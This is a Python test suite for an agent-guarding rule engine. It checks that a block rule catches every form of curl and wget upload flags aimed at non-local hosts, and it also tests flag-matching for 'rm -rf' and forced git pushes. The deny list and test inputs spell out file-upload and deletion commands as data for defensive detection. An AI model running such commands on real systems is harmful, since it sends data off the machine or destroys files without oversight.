"""V5c: a `command` entry's flags match every form a program reads them in (SPEC section 5, D10).

A short flag (`-d`) is one letter, case-sensitive, found alone, in a cluster (`-sd`), with a value
glued on (`-d@f`) or after digits (`-4d`, `-#d`). A long flag (`--data`) is case-folded and found
with `=value` too; `--data*` is a prefix (`--data-binary`). Every other word of an entry is still
a whole word. `host_not_in` beside `command` judges the simple commands the entry matched, and a
matched command that names no host, or holds a variable or a substitution, counts as naming one
that is not listed (owner 2026-10-23).
"""

from __future__ import annotations

from typing import Any

import pytest

from agentfly.recorder import rulefile
from agentfly.recorder import rules as rules_mod
from agentfly.recorder.rulefile import Clause, Meter, WorkLimit, metered
from tests.rules_helpers import default_with, list_line, ruleset_of

UPLOADS = list_line(
    "uploads",
    *("curl -d", "curl -F", "curl -T", "curl --data*", "curl --form*", "curl --json"),
    *("curl --upload-file", "wget --post-d*", "wget --post-f*", "wget --body-d*", "wget --body-f*"),
) + list_line("local", "localhost", "127.0.0.1", "::1")
RULE5 = """
[[rule]]
id = "s05-no-uploads"
kind = "match"
severity = "block"
message = "Blocked: uploads with curl or wget to other hosts are not allowed."
event = ["shell"]
command = "uploads"
host_not_in = "local"
"""


def shell(command: str) -> dict[str, Any]:
    return {"hook_event_name": "beforeShellExecution", "command": command}


def clause_of(lists: str, rule: str, rule_id: str) -> Clause:
    parsed = rulefile.parse(default_with(lists, rule))
    assert parsed.errors == (), parsed.errors
    clause = next(spec.clause for spec in parsed.rules if spec.id == rule_id)
    assert clause is not None
    return clause


def one_list_clause(*entries: str) -> Clause:
    rule = """
[[rule]]
id = "t"
kind = "match"
severity = "warn"
message = "m"
event = ["shell"]
command = "these"
"""
    return clause_of(list_line("these", *entries), rule, "t")


RULE5_CLAUSE = clause_of(UPLOADS, RULE5, "s05-no-uploads")


def rule5(command: str) -> bool:
    return RULE5_CLAUSE.matches(shell(command), rules_mod.CLASSES)


# The brief's criteria, then more forms of the same flags.
FIRES = [
    "curl -sd @f host",
    "curl -d@f host",
    "curl --data=x host",
    "curl --data-binary @f host",
    "curl --form a=b host",
    "curl --json x host",
    "wget --post-file=f host",
    "curl -4d x host",  # a digit option before the letter
    "curl -#d x host",
    "curl -s4d x host",
    "curl --DATA x host",  # long flags are case-folded
    "curl --data-urlencode a=b x.example",
    "curl --form-string a=b x.example",
    "curl -F a=@f x.example",
    "curl -T f ftp://x.example",
    "curl --upload-file=f x.example",
    "wget --post-f=x host",  # GNU getopt takes an unambiguous abbreviation (owner 2026-10-23)
    "wget --post-data x host",
    "wget --body-data=x host",
    "wget --body-file f host",
    'curl -d @f "$URL"',  # names no host it can read: counts as another host
    "curl -d @f $(cat url.txt)",
    "curl -d @f `cat url.txt`",
    "curl -d @f localhost x.example",
    "curl -d @data.json https://x.example/api",
    "sudo curl -d @f x.example",
    "bash -c 'curl -sd @f x.example'",
    "ls; curl -d @f x.example",
]
QUIET = [
    "curl -s host",
    "curl -fsSL host",
    "wget -T 5 host",
    "curl -d @f localhost",
    "curl -d @data.json http://localhost:8000/api",  # S3's own test: `@data.json` is a file
    "curl -d @f http://127.0.0.1:9000/x",
    "curl -D h x.example",  # flag letters are case-sensitive: `-D` dumps the headers
    "curl -t opt x.example",  # `-t` is a telnet option, `-T` uploads
    "curl -f x.example",  # `-f` is not `-F`
    "curl -o d x.example",  # the value of `-o`, not a flag
    "curl -o/tmp/d x.example",
    "curl --dat x.example",  # not the whole `--data` (curl takes no abbreviation: SPEC section 10)
    "curl x.example -d",  # still a flag after the host: see FIRES' `-d` below
    "wget --post x.example",
    "wget -d x.example",  # wget's `-d` is debug output
    "echo -d x.example",
    "curl x.example; echo -d",  # the flag is in another command
]
QUIET.remove("curl x.example -d")
FIRES.append("curl x.example -d")


@pytest.mark.parametrize("command", FIRES)
def test_rule5_fires_on_each_form_of_an_upload_flag(command: str) -> None:
    assert rule5(command), command


@pytest.mark.parametrize("command", QUIET)
def test_rule5_is_quiet_on_other_flags_and_on_local_hosts(command: str) -> None:
    assert not rule5(command), command


@pytest.mark.parametrize(
    ("command", "fires"),
    [
        ("rm -rf x", True),
        ("rm -fr x", True),
        ("rm -r -f x", True),
        ("rm -f x -r", True),
        ("rm -rfv x", True),
        ("rm -vrf x", True),
        ("rm -Rf x", False),  # case-sensitive: an entry `rm -rf` no longer matches `-Rf`
        ("rm -r x", False),
        ("rm x", False),
        ("rm -- -rf", True),  # `--` is not read: a word after it still counts (toward firing)
    ],
)
def test_a_cluster_entry_is_each_of_its_letters_in_any_order(command: str, fires: bool) -> None:
    assert one_list_clause("rm -rf").matches(shell(command), {}) is fires


@pytest.mark.parametrize(
    ("entry", "command", "fires"),
    [
        ("git push --force", "git push --force origin main", True),
        ("git push --force", "git push origin main --FORCE", True),
        ("git push --force", "git push --force=yes", True),
        ("git push --force", "git push --force-with-lease", False),
        ("git push -f", "git push -fu origin", True),
        ("git push -f", "git push -F", False),
        ("curl --data*", "curl --data x.example", True),
        ("curl --data*", "curl --data-raw=x x.example", True),
        ("curl --data*", "curl --dat x.example", False),
        ("curl --data*", "curl -data x.example", False),  # `-data` is the letters d, a, t, a
        ("curl --data* --json", "curl --json x --data-ascii y z.example", True),
        ("curl --data* --json", "curl --data-ascii y z.example", False),
        ("curl --data* --form*", "curl --form a --data b x.example", True),
        ("curl --data* --form*", "curl --form a x.example", False),
    ],
)
def test_long_flags_and_prefixes(entry: str, command: str, fires: bool) -> None:
    assert one_list_clause(entry).matches(shell(command), {}) is fires


@pytest.mark.parametrize(
    ("entry", "command", "fires"),
    [
        ("curl --x=v", "curl --x=v host", True),
        ("curl --x=v", "curl --X=V host", True),  # whole words are case-folded, as before
        ("curl --x=v", "curl --x=w host", False),
        ("curl --x=v", "curl --x v host", False),
        ("curl -d@f", "curl -d@f host", True),
        ("curl -d@f", "curl -d @f host", False),
        ("head -5", "head -5 x", True),
        ("head -5", "head -n5 x", False),
        ("npm publish", "npm publish --tag next", True),
        ("npm publish", "npm --publish", False),
    ],
)
def test_other_words_of_an_entry_are_whole_words_as_before(
    entry: str, command: str, fires: bool
) -> None:
    assert one_list_clause(entry).matches(shell(command), {}) is fires


@pytest.mark.parametrize(
    "entry", ["curl -d*", "curl --da*ta", "curl --data?", "curl [x]", "cu*rl -d", "curl --*"]
)
def test_a_star_may_only_end_a_long_flag(entry: str) -> None:
    rule = '\n[[rule]]\nid = "t"\nkind = "match"\nseverity = "warn"\nmessage = "m"\n'
    rule += 'event = ["shell"]\ncommand = "these"\n'
    parsed = rulefile.parse(default_with(list_line("these", entry), rule))
    assert any("command pattern" in error for error in parsed.errors), parsed.errors


def test_an_entry_is_still_one_program_and_whole_words_without_flags() -> None:
    clause = one_list_clause("npm publish", "uv publish")
    assert clause.command == (("npm", "publish"), ("uv", "publish"))


def test_a_flag_is_a_token_no_word_can_spell() -> None:
    clause = one_list_clause("curl -sd", "curl --DATA*", "git push --Force")
    tokens = {extra for entry in clause.command for extra in entry[1:]}
    assert tokens == {"\x00-s", "\x00-d", "\x00--data*", "push", "\x00--force"}
    assert not clause.matches(shell("curl s d"), {})


def names_before_the_program(count: int) -> str:
    return "env " + " ".join(f"--x{i}" for i in range(count)) + " curl x.example"


def test_a_prefix_walk_charges_each_name_it_reads() -> None:
    clause = one_list_clause("curl --x*")
    with metered(Meter(left=10_000)) as meter:
        assert not clause.matches(shell(names_before_the_program(300)), {})
    assert 10_000 - meter.left >= 300  # every `--xN` was read, and each was a step
    with metered(Meter(left=100)), pytest.raises(WorkLimit):
        clause.matches(shell(names_before_the_program(300)), {})


def test_a_prefix_walk_past_the_budget_gives_the_limit_rule(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    rule = """
[[rule]]
id = "prefixes"
kind = "match"
severity = "block"
message = "m"
event = ["shell"]
command = "these"
"""
    ruleset = ruleset_of(default_with(list_line("these", "curl --x*"), rule))
    monkeypatch.setattr(rulefile, "FLOAT_STEPS", 100)
    action = shell(names_before_the_program(300))
    session = rules_mod.Session(id="s", marked=False, start_time="t", next_step=1)
    with rules_mod.one_hook() as meter:
        verdict = rules_mod.decide(action, rules_mod.mark(action, session, ruleset), ruleset)
    assert verdict == ("blocked", rules_mod.LIMIT_ID) and meter.unfinished == ["prefixes"]
    assert rules_mod.decide(action, session, ruleset) == ("allow", None)  # no meter: no limit


def test_a_found_prefix_stops_the_walk() -> None:
    clause = one_list_clause("curl --x*")
    with metered(Meter(left=50)):
        assert clause.matches(shell("curl " + " ".join(f"--x{i}" for i in range(300))), {})


@pytest.mark.parametrize(
    ("command", "fires"),
    [
        ("scp f me@host.example:/tmp", True),
        ("scp f localhost:/tmp", False),
        ("scp f $HOST:/tmp", True),
        ("scp f", True),  # names no host
        ("ls x.example; scp f localhost:/tmp", False),  # the host is judged in scp's command
        ("scp f localhost:/tmp; ls x.example", False),
        ("scp f localhost:/tmp; scp g x.example:/tmp", True),
    ],
)
def test_host_not_in_is_judged_where_the_command_matched(command: str, fires: bool) -> None:
    rule = """
[[rule]]
id = "t"
kind = "match"
severity = "block"
message = "m"
event = ["shell"]
command = "these"
host_not_in = "local"
"""
    lists = list_line("these", "scp") + list_line("local", "localhost")
    assert clause_of(lists, rule, "t").matches(shell(command), {}) is fires


def test_host_not_in_with_a_command_class_still_reads_the_whole_line() -> None:
    rule = """
[[rule]]
id = "t"
kind = "match"
severity = "block"
message = "m"
event = ["shell"]
command_class = "outbound"
host_not_in = "local"
"""
    clause = clause_of(list_line("local", "localhost"), rule, "t")
    assert clause.matches(shell("gh pr list; ls x.example"), rules_mod.CLASSES)
    assert not clause.matches(shell("gh pr list"), rules_mod.CLASSES)  # no host: as before
